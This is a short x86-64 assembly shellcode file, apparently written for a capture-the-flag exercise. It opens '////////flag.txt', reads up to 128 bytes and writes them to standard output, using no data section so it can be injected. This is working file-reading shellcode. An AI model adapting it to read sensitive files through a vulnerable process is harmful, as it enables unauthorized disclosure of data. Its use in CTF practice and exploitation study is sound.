global _start
; shell optimized code with no .data

section .text
_start:
    sub rsp, 8
    mov rdi, "flag.txt"
    push rdi
    mov rdi, "////////"
    push rdi

    mov al, 2    ; syscall for open
    mov rdi, rsp ; pointer to filepath
    xor rsi, rsi ; readonly flag
    syscall      ; open > out file descriptor > rax

    sub rsp, 64  ; allocate buffer on the stack
    sub rsp, 64
    sub rsp, 64  ; allocate buffer on the stack
    mov rsi, rsp ; Pointer to the buffer
    mov rdi, rax ; move file descriptor to rdi
    xor rax, rax ; Syscall number for read (0)
    mov dl, 128  ; Number of bytes to read
    syscall      ; read > out read bytes > rax

    ; dil = length, rsi = pointer
    mov dl, al ; dl/rdx length
    mov al, 1   ; sys_write
    mov dil, 1  ; std_out
    syscall

exit:
    mov al, 60
    xor rdi, rdi
    syscall
